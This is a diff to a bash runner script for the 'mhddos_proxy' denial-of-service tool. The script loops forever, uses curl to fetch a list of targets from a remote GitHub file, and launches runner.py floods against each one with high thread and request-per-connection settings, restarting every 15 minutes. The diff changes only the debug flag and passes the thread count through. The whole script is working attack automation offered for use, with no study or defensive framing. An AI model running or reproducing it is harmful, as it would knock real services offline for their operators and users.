@@ -11,7 +11,7 @@ python3 -m pip install -r requirements.txt
 threads="${1:-500}"; threads="-t $threads"
 rpc="--rpc 1000"
 proxy_timer_update="-p 3600"
-debug="--table"
+debug="--debug"
 
 # Restart attacks and update targets every 15 minutes
 while true
@@ -30,7 +30,7 @@ do
       do
             cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets  | cat | grep "^[^#]")")
             echo -e $i": " $cmd_line $threads $rpc $proxy_timer_update "--debug\n"
-            python3 ~/mhddos_proxy/runner.py $cmd_line $debug&
+            python3 ~/mhddos_proxy/runner.py $cmd_line $threads $debug&
       done
 sleep 15m
 done
